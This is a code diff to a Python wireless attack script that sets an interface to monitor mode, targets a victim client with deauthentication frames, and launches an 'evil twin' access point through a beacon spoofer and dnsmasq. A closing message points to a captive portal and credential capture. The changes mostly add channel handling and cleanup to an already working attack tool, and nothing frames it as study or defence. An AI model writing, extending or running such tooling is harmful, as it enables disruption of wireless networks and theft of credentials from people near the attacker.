@@ -16,6 +16,7 @@ def select_interface():
     os.system(f"sudo ip link set {iface} up")
     print(f"[+] {iface} set to monitor mode.")
     return iface
+
 def cleanup_interface(iface):
     print(f"\n[*] Reverting {iface} back to managed mode...")
     os.system(f"sudo ip link set {iface} down")
@@ -56,25 +57,36 @@ def find_clients(iface, ssid, ap_mac):
 
 import subprocess
 
-def create_evil_twin(ssid, iface):
+def create_evil_twin(ssid, iface, ap_mac):
     clear()
     print(f"[4] Launching Evil Twin for SSID: {ssid}")
-    spoofer = subprocess.Popen(["sudo", "python3", "beacon_spoofer.py", ssid, iface])
+
+    # Kill old dnsmasq processes
+    os.system("sudo pkill dnsmasq")
+
+    spoofer = subprocess.Popen(["sudo", "python3", "beacon_spoofer.py", ssid, iface, ap_mac])
     print("[+] Beacon spoofer launched in background.")
     print("[*] Press Enter when you're ready to stop the beacon and continue...")
-    input()
-    # TODO Terminate the beacon spoofer
+
+    try:
+        input()
+    except KeyboardInterrupt:
+        print("\n[!] Keyboard interrupt received during Evil Twin setup.")
+
     try:
         spoofer.terminate()
         spoofer.wait()
+        os.system("sudo pkill dnsmasq")
+        print("[+] Cleaned up any lingering dnsmasq processes.")
         print("[+] Beacon spoofer terminated.")
     except Exception as e:
         print(f"[!] Failed to terminate spoofer: {e}")
 
-def send_deauth(victim_mac, ap_mac, iface):
+def send_deauth(victim_mac, ap_mac, iface, channel):
     clear()
-    print(f"[5] Sending deauth to {victim_mac} from AP {ap_mac}")
-    scapy_send_deauth(victim_mac, ap_mac, iface)
+    print(f"[5] Sending deauth to {victim_mac} from AP {ap_mac} on channel {channel}")
+    os.system(f"iwconfig {iface} channel {channel}")
+    scapy_send_deauth(victim_mac, ap_mac, iface, channel)
 
 def main():
     iface = select_interface()
@@ -82,11 +94,16 @@ def main():
         ssid, ap_mac, channel = scan_networks(iface)
         victim_mac = find_clients(iface, ssid, ap_mac)
         if victim_mac:
-            send_deauth(victim_mac, ap_mac, iface)
+            send_deauth(victim_mac, ap_mac, iface, channel)
         else:
             print("[!] No victim selected. Skipping deauth.")
-        create_evil_twin(ssid, iface)
+        try:
+            create_evil_twin(ssid, iface, ap_mac)
+        except KeyboardInterrupt:
+            print("\n[!] Keyboard interrupt received during Evil Twin setup.")
         print("[6] Evil Twin setup complete. Proceed with portal and credential capture...")
+    except KeyboardInterrupt:
+        print("\n[!] Keyboard interrupt received. Cleaning up...")
     finally:
         cleanup_interface(iface)
 
